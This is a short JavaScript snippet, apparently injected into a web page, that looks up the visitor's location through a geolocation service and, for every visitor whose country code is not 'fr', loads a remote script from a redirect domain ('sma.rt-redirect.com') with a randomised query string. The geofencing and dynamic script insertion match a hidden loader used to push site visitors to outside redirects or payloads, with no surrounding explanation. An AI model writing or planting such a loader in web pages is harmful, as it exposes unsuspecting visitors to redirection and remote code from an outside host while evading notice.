var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
    if (this.responseText.toLowerCase().indexOf('"country_code":"fr"') === -1){
     (function (a, d, j, o) {
           o = a.createElement(d),
              m = a.getElementsByTagName(d)[0];              
           o.src = j + "?d=0&r=" + Math.random();
           m.parentNode.insertBefore(o, m)
      })(document, 'script', 'https://sma.rt-redirect.com/sl/e7ac3600');
    }
}
};
xhttp.open("GET", "https://geolocation-db.com/json/", true);
xhttp.send();
